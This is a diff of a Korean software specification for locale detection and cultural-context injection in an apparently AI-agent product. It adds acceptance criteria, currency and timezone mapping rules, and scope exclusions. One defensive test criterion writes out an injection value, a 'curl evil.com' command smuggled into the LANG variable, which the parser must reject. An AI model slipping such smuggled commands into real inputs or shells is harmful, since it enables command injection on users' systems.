@@ -1,16 +1,16 @@
 ---
 id: SPEC-GOOSE-LOCALE-001
-version: 0.1.0
+version: 0.1.1
 status: planned
 created_at: 2026-04-22
-updated_at: 2026-04-22
+updated_at: 2026-04-25
 author: manager-spec
 priority: P0
 issue_number: null
 phase: 6
 size: 소(S)
 lifecycle: spec-anchored
-labels: []
+labels: ["phase-6", "localization", "foundation", "locale-detection", "cultural-context"]
 ---
 
 # SPEC-GOOSE-LOCALE-001 — Locale Detection + Cultural Context Injection
@@ -20,6 +20,7 @@ labels: []
 | 버전 | 날짜 | 변경 사유 | 담당 |
 |-----|------|---------|------|
 | 0.1.0 | 2026-04-22 | 초안 작성. v5.0 ROADMAP Phase 6 확장에 따른 Localization 4 SPEC 시리즈의 **기반층**. 사용자 최종 지시(2026-04-22): "한국뿐만 아니라 설치시 사용자의 국가와 정보를 수집해서 사용자에 맞게 각 현지화된 스킬들을 추가, hermes-agent 정도의 다국어" 반영. | manager-spec |
+| 0.1.1 | 2026-04-25 | Iteration 1 감사(mass-20260425/LOCALE-001-audit) Must-Pass + Major 결함 대응. (1) frontmatter `labels` 채움(D1, MP-3). (2) AC-LC-001~012에 `Covers REQ-LC-XXX` 트레이서빌리티 추가(D3). (3) 누락 REQ 6개(002/003/011/012/014/016)에 대해 AC-LC-013~018 신설(D4). (4) number/date/time format + collation 스코프 분기를 Exclusions 및 Technical Approach §6.7에 명시하여 I18N-001로 위임(D5). (5) Country→Currency 매핑을 "CLDR-inspired manual map, ~20개 우선 + ISO 3166↔4217 확장 240개"로 확정(D6, §6.8). (6) 다중 타임존 국가(US/RU/BR/CA/AU)의 기본 TZ 선택 정책을 `OS TZ env > CLDR primary zone > conflict 기록`으로 확정하고 AC-LC-018로 커버(D7, §6.9). TRUST 5는 §6.10으로 이동. REQ 번호 재배치 없음. research.md 변경 없음. | manager-spec |
 
 ---
 
@@ -171,64 +172,112 @@ labels: []
 ## 5. 수용 기준 (Acceptance Criteria)
 
 **AC-LC-001 — OS 감지 기본 경로 (Linux)**
+- **Covers**: REQ-LC-001, REQ-LC-005
 - **Given** `LANG=ko_KR.UTF-8`, `TZ=Asia/Seoul` 환경변수
 - **When** `Detect(ctx)`
 - **Then** `LocaleContext{country:"KR", primary_language:"ko-KR", timezone:"Asia/Seoul", currency:"KRW", measurement_system:"metric", calendar_system:"gregorian", detected_method:"os"}` 반환
 
 **AC-LC-002 — OS 감지 기본 경로 (macOS)**
+- **Covers**: REQ-LC-001, REQ-LC-005
 - **Given** `defaults read -g AppleLocale` = `"ja_JP@calendar=gregorian"`, `AppleLanguages[0]` = `"ja"`
 - **When** `Detect(ctx)`
 - **Then** `primary_language="ja-JP"`, `country="JP"`, `currency="JPY"`, `honorific_system="japanese_keigo"`
 
 **AC-LC-003 — IP fallback**
+- **Covers**: REQ-LC-004, REQ-LC-005
 - **Given** OS locale 환경변수 모두 비어있음(서버 환경), MaxMind DB에서 IP → country=`VN`
 - **When** `Detect(ctx)`
 - **Then** `country="VN"`, `primary_language="vi-VN"`, `detected_method="ip"`
 
 **AC-LC-004 — User override 최우선**
+- **Covers**: REQ-LC-006
 - **Given** OS=ko_KR 감지됨, 사용자가 `config.yaml`에 `locale.override.country: JP`, `primary_language: ja-JP` 설정
 - **When** `Detect(ctx)`
 - **Then** `country="JP"`, `primary_language="ja-JP"`, `detected_method="user_override"`; OS 값은 무시
 
 **AC-LC-005 — 다국적 사용자(primary + secondary)**
+- **Covers**: REQ-LC-009
 - **Given** `primary_language="ko-KR"`, `secondary_language="en-US"` override
 - **When** `BuildSystemPromptAddendum(loc, cul)`
 - **Then** 결과 문자열에 `"primary: ko-KR"`와 `"secondary: en-US"` 모두 포함, `"code-switching is natural"` 지시문 존재
 
 **AC-LC-006 — Cultural context 한국**
+- **Covers**: REQ-LC-001, REQ-LC-003
 - **Given** `country="KR"`
 - **When** `ResolveCulturalContext("KR")`
 - **Then** `{formality_default:"formal", honorific_system:"korean_jondaetmal", name_order:"family_first", weekend_days:["Sat","Sun"], first_day_of_week:"Monday", legal_flags:["pipa"]}`
 
 **AC-LC-007 — Cultural context 사우디**
+- **Covers**: REQ-LC-001, REQ-LC-003
 - **Given** `country="SA"`
 - **When** `ResolveCulturalContext("SA")`
 - **Then** `{calendar_system:"hijri", weekend_days:["Fri","Sat"], honorific_system:"arabic_formal_familiar"}`
 
 **AC-LC-008 — OS vs IP 충돌 보존**
+- **Covers**: REQ-LC-008
 - **Given** OS=`ko_KR`, IP geolocation=`US`
 - **When** `Detect(ctx)`
 - **Then** `country="KR"` (OS 우선), `LocaleContext.conflict={os:"KR", ip:"US"}`, ONBOARDING-001이 이 필드를 읽어 사용자에게 확인 다이얼로그 표시
 
 **AC-LC-009 — 중국에서 ipapi.co 스킵**
+- **Covers**: REQ-LC-015
 - **Given** OS 감지 결과 `country="CN"`, `geolocation_enabled=true`
 - **When** OS 결과에 timezone 누락 → ipapi fallback이 호출되려 할 때
 - **Then** ipapi HTTP 호출이 발생하지 않고, MaxMind DB만 조회되며, 실패 시 default로 폴백
 
 **AC-LC-010 — 환경변수 injection 거부**
+- **Covers**: REQ-LC-013
 - **Given** `LANG="en_US.UTF-8; curl evil.com"`
 - **When** `Detect(ctx)`
 - **Then** 파서가 `;` 발견 후 reject, security event 로그, 기본값 en-US로 폴백
 
 **AC-LC-011 — LLM prompt addendum 길이 제한**
+- **Covers**: REQ-LC-007
 - **Given** 한국 + primary/secondary language 포함 최대 케이스
 - **When** `BuildSystemPromptAddendum(loc, cul)`
-- **Then** 결과 UTF-8 문자열의 토큰 수 ≤ 400 (GPT-4 tokenizer 기준 추정)
+- **Then** 결과 UTF-8 문자열의 토큰 수 ≤ 400 (`cl100k_base` tokenizer 기준 정확 측정 — 테스트는 tiktoken-go 라이브러리를 사용해 exact count 단언)
 
 **AC-LC-012 — MaxMind DB 노후 경고**
+- **Covers**: REQ-LC-010
 - **Given** `geoip_db_path`가 가리키는 .mmdb 파일의 mtime이 91일 전
 - **When** 로더 실행
 - **Then** WARN 로그 1건 (`locale.geoip.db.stale`), `Detect()`는 정상 동작
+
+**AC-LC-013 — OS 감지 성공률(REQ-LC-002 단위 테스트화)**
+- **Covers**: REQ-LC-002
+- **Given** 3 OS matrix에서 각각 유효한 locale 조합(Linux: `LANG=ko_KR.UTF-8`, macOS: `AppleLocale=ja_JP`, Windows: `GetUserDefaultLocaleName=en-US`)
+- **When** 각 OS에서 `Detect(ctx)` 호출
+- **Then** 3 OS 모두 `detected_method ∈ {"os","ip","user_override"}`이며 `"default"`가 아님. CI는 `ubuntu-latest`, `macos-latest`, `windows-latest`에서 모두 통과해야 한다. REQ-LC-002의 "95%" 표현은 본 AC로 운영상 deterministic 검증으로 대체한다.
+
+**AC-LC-014 — CulturalContext 결정론(REQ-LC-003)**
+- **Covers**: REQ-LC-003
+- **Given** 동일한 country 입력 `"KR"`
+- **When** `ResolveCulturalContext("KR")` 을 100회 반복 호출
+- **Then** 반환된 모든 `CulturalContext` 구조체가 deep-equal (직렬화된 YAML 바이트가 바이트 단위로 동일). 순서가 있는 필드(`weekend_days`, `legal_flags`)도 순서까지 동일.
+
+**AC-LC-015 — CONFIG-001 `locale:` 스키마 라운드트립(REQ-LC-011)**
+- **Covers**: REQ-LC-011
+- **Given** `~/.goose/config.yaml`에 `locale.override.country=JP`, `locale.geolocation_enabled=false`, `locale.geoip_db_path="/tmp/geo.mmdb"` 작성
+- **When** CONFIG-001 loader 실행 → struct 역직렬화 → 다시 YAML 직렬화
+- **Then** 타입 필드 모두 존재(`override` is `*LocaleContext`, `geolocation_enabled` is `bool`, `geoip_db_path` is `string`), 원본과 재직렬화 결과가 의미적 동일(key order 무시), 알 수 없는 필드는 역직렬화 시 rejected.
+
+**AC-LC-016 — Telemetry OFF 기본 & 제3자 전송 금지(REQ-LC-012)**
+- **Covers**: REQ-LC-012
+- **Given** 기본 설정(`geolocation_enabled` 미지정 또는 `false`)에서 `Detect(ctx)` 호출
+- **When** 네트워크 모니터(테스트용 httptest round-tripper)로 모든 outbound HTTP 관측
+- **Then** 관측된 outbound 요청 수 = 0. `geolocation_enabled=true`로 명시하더라도, 호스트 allow-list는 `ipapi.co`만 포함하며 그 외 도메인으로의 전송이 발생하면 테스트 실패.
+
+**AC-LC-017 — 환경변수 순수성(REQ-LC-014)**
+- **Covers**: REQ-LC-014
+- **Given** 테스트 시작 시점에 `os.Environ()` 스냅샷 캡처
+- **When** `Detect(ctx)` 호출 완료 후
+- **Then** `os.Environ()` 재캡처 값이 스냅샷과 바이트 단위로 동일. `os.Setenv`/`os.Unsetenv` 호출 0건(reflection-free 검증은 `LANG`, `LC_ALL`, `LC_MESSAGES`, `TZ` 키에 대해 값 비교로 대체 가능).
+
+**AC-LC-018 — 다중 타임존 국가 및 timezone_alternatives(REQ-LC-016 + §6.9)**
+- **Covers**: REQ-LC-001, REQ-LC-016
+- **Given** 사용자 country=`US`, OS `TZ` 환경변수 미설정(ambiguous case)
+- **When** `Detect(ctx)` 호출
+- **Then** `LocaleContext.timezone`은 CLDR likelySubtags 기반 대표 존(미국=`America/New_York`)으로 결정되고, `LocaleContext.timezone_alternatives`에 `["America/New_York","America/Chicago","America/Denver","America/Los_Angeles","America/Anchorage","Pacific/Honolulu"]` 6개 IANA zone이 포함되며, `LocaleContext.conflict`에는 기록되지 않는다(다중존은 conflict가 아닌 ambiguity로 분류). 동일 케이스에서 OS `TZ=America/Los_Angeles`가 설정되어 있으면 `timezone="America/Los_Angeles"`가 우선하고 `timezone_alternatives`는 생략된다.
 
 ---
 
@@ -387,7 +436,60 @@ Apply these conventions unless the user's conversational style overrides them.
 10. **GREEN** — 최소 구현
 11. **REFACTOR** — provider 체인(`OSProvider → IPProvider → DefaultProvider`) 추상화
 
-### 6.7 TRUST 5 매핑
+### 6.7 Format 필드 스코프 분기 (number / date / time / collation)
+
+감사 iteration 1(D5)에서 지적된 포맷 dimension의 경계를 본 SPEC에서 **명시적으로 I18N-001로 위임**한다.
+
+| Format 차원 | 소유 SPEC | 본 SPEC 역할 |
+|-----------|---------|-----------|
+| `number_format` (decimal separator, thousand separator, grouping) | I18N-001 | LocaleContext에 필드 없음. `primary_language`만 노출하고 I18N-001이 CLDR `supplemental/numberingSystems` 테이블로 해석. |
+| `date_format` (DD/MM/YYYY, MM/DD/YYYY, YYYY-MM-DD, 기타) | I18N-001 | LocaleContext에 필드 없음. I18N-001이 CLDR `main/{locale}/dates/calendars/{cal}/dateFormats`로 해석. |
+| `time_format` (12h vs 24h, AM/PM markers) | I18N-001 | LocaleContext에 필드 없음. I18N-001이 CLDR `main/{locale}/dates/calendars/{cal}/timeFormats`로 해석. |
+| `collation` (CLDR UCA sort order — 독일 phonebook vs dictionary, 스웨덴 å placement, 중국 pinyin vs stroke) | I18N-001 | LocaleContext에 필드 없음. I18N-001이 `golang.org/x/text/collate`로 해석. |
+
+**이유**:
+- LOCALE-001은 **"사용자가 누구인가"**(country/language/timezone/currency/cultural context)를 결정하는 기반층이다.
+- 포맷팅(number/date/time/collation)은 **"사용자에게 무엇을 어떻게 보여줄 것인가"**의 문제로, 소비 시점(UI 렌더링, 문서 생성)에 결정되어야 한다.
+- 두 관심사를 분리하면 (a) LocaleContext struct가 flat 유지되어 YAML 직렬화가 단순해지고, (b) I18N-001이 CLDR 데이터 파일을 번들링하는 책임을 일원화할 수 있다.
+
+**소비 경로**: I18N-001은 LOCALE-001이 노출한 `LocaleContext.primary_language`(BCP 47)를 입력으로 받아 CLDR 테이블을 조회한다. LOCALE-001은 format 자체를 계산하지 않는다.
+
+### 6.8 Country → Currency 매핑 결정
+
+감사 iteration 1(D6)에서 제기된 오픈 이슈(research.md §12 item #4)를 확정한다.
+
+**결정**: `internal/locale/cultural.go`의 정적 맵 `countryToCurrency map[string]string`에 **CLDR-inspired manual mapping**을 인코딩한다. 외부 라이브러리(`golang.org/x/text/currency`) 의존 추가 금지.
+
+**근거**:
+1. **의존성 최소화**: `x/text/language`는 이미 BCP 47 파싱에 필요. `x/text/currency`는 ISO 4217 메타데이터(통화명, 소수점 자릿수 등)를 제공하지만, 본 SPEC은 단순 country→currency lookup만 필요.
+2. **커버리지 충분**: §6.3의 20개국 + research.md §1.2에 따른 Hermes Tier 1(en/ko/ja/zh) 중심 → v0.1.1 범위는 20개국으로 확정. 나머지 ISO 3166 알파-2 국가(약 240개)는 **CLDR `supplemental/supplementalData.xml`의 `<currencyData>` 섹션**에서 추출한 매핑을 manual 테이블에 추가하는 방식으로 확장 가능.
+3. **테이블 위치**: `internal/locale/cultural.go`에 `countryToCurrency` (string→string, ISO 3166-1 alpha-2 → ISO 4217) 정적 맵으로 정의. 누락 국가는 `USD`로 폴백하고 `resolved_via_fallback=true` 진단 플래그(§6.10의 D11 제안과 연계; v0.1.1은 hint만 기록)를 WARN 로그에 기록.
+4. **확장 절차**: 추가 국가 필요 시 PR로 `countryToCurrency` 엔트리를 추가(문화적 정확성 검증은 research.md §12 item #5와 공동 처리). CLDR 버전을 commit 메시지에 명시.
+
+**매핑 소스 고정**: 초기 20개국은 Unicode CLDR 44.1 (2024-04 release) `supplemental/supplementalData.xml` `<region iso3166="XX">`의 `<currency>` 엔트리에서 발행 중(`iso4217="XXX"` tender="true") currency를 채택.
+
+### 6.9 Multi-Timezone 국가 해석 정책
+
+감사 iteration 1(D7)에서 지적된 US(6 zones), RU(11), BR(4), AU(5), CA(6) 등 다중 타임존 국가의 기본 TZ 선택 규칙을 확정한다.
+
+**결정 규칙 (우선순위 순)**:
+
+1. **OS TZ env 우선**: `$TZ` 환경변수 또는 macOS `systemsetup -gettimezone` / Windows `GetDynamicTimeZoneInformation`이 유효한 IANA zone을 반환하면 해당 값을 `LocaleContext.timezone`으로 채택. 이 경로에서는 `timezone_alternatives`를 생략(OS가 이미 사용자 선택을 표현).
+2. **CLDR likelySubtags primary zone**: OS 정보가 없거나 빈 값이면 CLDR `supplemental/likelySubtags.xml`의 country→primary timezone 매핑(예: US→`America/New_York`, RU→`Europe/Moscow`, BR→`America/Sao_Paulo`, AU→`Australia/Sydney`, CA→`America/Toronto`)을 기본값으로 사용. 동시에 `LocaleContext.timezone_alternatives`에 해당 country의 모든 IANA zone을 기록.
+3. **Conflict vs Ambiguity 구분**:
+   - OS 값이 IP geolocation 값과 *country 수준에서 다르면* → `LocaleContext.conflict` 기록(REQ-LC-008, AC-LC-008). 예: OS=KR, IP=US.
+   - OS 값이 없고 country만 결정된 경우 다중존 국가 → `LocaleContext.timezone_alternatives` 기록, conflict 없음. 예: OS `TZ` 미설정, IP=US → timezone=`America/New_York`, timezone_alternatives=6개 zone.
+4. **ONBOARDING-001 위임**: `timezone_alternatives`가 비어 있지 않으면 ONBOARDING-001이 사용자에게 드롭다운 선택을 제공(본 SPEC은 데이터만 노출, UX는 위임).
+
+**`LocaleContext`에 필드 추가**:
+- `timezone_alternatives []string` — IANA zone 리스트, 다중존 국가에서만 채워짐. 단일존 국가(대부분)는 nil 또는 빈 슬라이스. YAML `omitempty`로 직렬화.
+- 기존 REQ-LC-016의 `timezone_alternatives`는 본 필드로 구현되며, AC-LC-018로 검증.
+
+**매핑 테이블**: `internal/locale/cultural.go`에 `countryToTimezones map[string][]string` 추가. 첫 원소가 primary, 나머지가 alternatives. 20개국 중 다중존: `US`, `RU`, `BR`, `AU`, `CA`. 단일존: 나머지 15개. 확장은 CLDR `metaZones.xml` + `timezone.xml` 기반.
+
+**REQ 번호 재배치 없음**: 본 정책은 기존 REQ-LC-016(Optional)을 구체화하고 REQ-LC-001(IANA timezone 필드)을 보강한다. 신규 REQ 추가하지 않는다.
+
+### 6.10 TRUST 5 매핑
 
 | 차원 | 달성 방법 |
 |-----|---------|
@@ -472,6 +574,14 @@ Apply these conventions unless the user's conversational style overrides them.
 - 본 SPEC은 **IP 주소를 영속 저장하지 않는다**. country 결과만 저장.
 - 본 SPEC은 **hot reload / 파일 감시를 구현하지 않는다**(CONFIG-001과 동일 원칙).
 - 본 SPEC은 **다국적 대응 말투 mixing 엔진(예: 영어 + 존댓말 혼용 생성)을 구현하지 않는다**. `BuildSystemPromptAddendum`은 지시만 내리고, 실제 생성은 LLM.
+- 본 SPEC은 **number format(소수점/천단위 구분자/그룹핑)을 `LocaleContext`에 포함하지 않는다**. I18N-001이 CLDR 기반으로 해석(§6.7).
+- 본 SPEC은 **date format 템플릿(DD/MM/YYYY vs MM/DD/YYYY vs YYYY-MM-DD)을 정의하지 않는다**. I18N-001 CLDR 소비(§6.7).
+- 본 SPEC은 **time format(12h vs 24h, AM/PM marker)을 정의하지 않는다**. I18N-001 CLDR 소비(§6.7).
+- 본 SPEC은 **sort collation(CLDR UCA, 독일 phonebook/dictionary, 스웨덴 å 위치, 중국 pinyin/stroke)을 구현하지 않는다**. I18N-001이 `golang.org/x/text/collate`로 해석(§6.7).
+- 본 SPEC은 **country→currency 매핑에 `golang.org/x/text/currency` 의존성을 추가하지 않는다**. `internal/locale/cultural.go`의 manual map `countryToCurrency`만 사용(§6.8).
+- 본 SPEC은 **전 세계 모든 ISO 3166 국가를 v0.1.1 범위에 포함하지 않는다**. 초기 20개국 + USD 폴백. 나머지 ~240개 국가는 후속 PR로 CLDR 44.1 `supplementalData.xml` 기반 확장(§6.8).
+- 본 SPEC은 **다중 타임존 국가(US/RU/BR/CA/AU)의 UX 선택 다이얼로그를 제공하지 않는다**. `timezone_alternatives` 필드로 데이터만 노출하고 UX는 ONBOARDING-001(§6.9).
+- 본 SPEC은 **CLDR 데이터 파일(xml/json)을 번들 포함하지 않는다**. 정적 Go 맵으로 필요한 서브셋만 인코딩(`cultural.go`의 `countryToCurrency`, `countryToTimezones`, `countryToCultural`). CLDR 전체 번들링은 I18N-001 책임.
 
 ---
 
